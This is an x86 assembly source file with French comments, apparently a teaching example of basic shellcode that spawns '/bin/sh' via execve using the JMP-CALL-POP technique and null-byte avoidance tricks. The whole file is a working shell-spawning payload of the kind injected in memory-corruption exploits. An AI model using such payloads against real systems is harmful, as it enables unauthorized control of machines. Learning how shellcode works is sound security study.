;****************************************************************************************************
; Shellcode basique qui exécute la commande "/bin/sh" avec la technique JMP-CALL-POP
;
; Compilation et exécution :
;		nasm -f elf Shellcode.asm -o Shellcode.o && ld -m elf_i386 Shellcode.o -o Shellcode.exe && ./Shellcode.exe
;
; Méthode manuelle pour vérifier la traduction du code assembleur :
;		nasm -f elf Shellcode.asm && ld -m elf_i386 -o Shellcode Shellcode.o && objdump -D Shellcode
;
; Site utile pour traduire et corriger les shellcodes : 
;		https://defuse.ca/online-x86-assembler.htm
;
; Penser à utiliser Strace pour débugger en suivant les appels système et les signaux :
;		strace ./Shellcode
;
; Listes de shellcodes plus poussés :
;     	- https://shell-storm.org/shellcode/
;     	- https://www.exploit-db.com/shellcodes
;
;
;****************************************************************************************************


_start:


; Nettoyage des registres
; Il faut absolument utiliser des XOR puisque "mov eax, 0" inclurait un null byte par exemple
; Cette manière de faire est d'ailleurs une technique d'optimisation courante en x86
;
; "mov eax, 0" <=> "\xB8\x00\x00\x00\x00"
; "xor eax, eax" <=> "\x31\xC0"

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx


; Remplissage du registre EAX avec le bon appel système (la fonction execve() dans ce cas)
; On utilise "al" parce qu'il est impératif de remplir la plus petite partie du registre possible (8 bits dans ce cas)
; Sinon on va se retrouver avec des null bytes à cause de la complétion automatique puisque la valeur 11 serait codée sur 32 bits
;
; "mov eax, 11" <=> "\xB8\x0B\x00\x00\x00"
; "mov al, 11" <=> "\xB0\x0B"

mov al, 11


; Début du JMP-CALL-POP
; L'idée du JMP-CALL-POP est surtout d'éviter les références codées en dur pour que le shellcode soit totalement portable et indépendant de l'environnement 
; L'instruction "jmp" sert à éviter que le "call" génère des null bytes par complétion et doit absolument être placée avant conjointement avec le "pop"
; L'instruction "call" pousse l'adresse de la prochaine instruction sur la pile, donc en l'occurrence l'adresse de la chaîne de caractères "/bin/sh"
; L'instruction "pop" retire l'adresse fraîchement placée dans la pile et la stocke dans EBX

jmp shellcode


suite_shellcode:

pop ebx
int 0x80


shellcode:

call suite_shellcode
db "/bin/sh"
